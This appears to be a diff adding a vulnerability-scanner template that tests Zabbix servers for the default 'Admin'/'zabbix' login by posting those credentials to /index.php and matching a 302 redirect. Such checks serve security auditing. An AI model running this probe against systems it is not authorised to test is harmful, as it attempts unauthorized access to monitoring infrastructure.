@@ -1,0 +1,23 @@
+id: poc-yaml-zabbix-dfpass
+
+info:
+  name: poc-yaml-zabbix-dfpass
+  author: fuzz7j(https://github.com/fuzz7j)
+  severity: high
+  tags: xray-converted
+  reference:
+    - https://www.zabbix.com/documentation/3.4/zh/manual/quickstart/login
+
+http:
+  - raw:
+      - |
+        POST /index.php HTTP/1.1
+        Host: {{Hostname}}
+
+        name=Admin&password=zabbix&autologin=1&enter=Sign+in
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 302
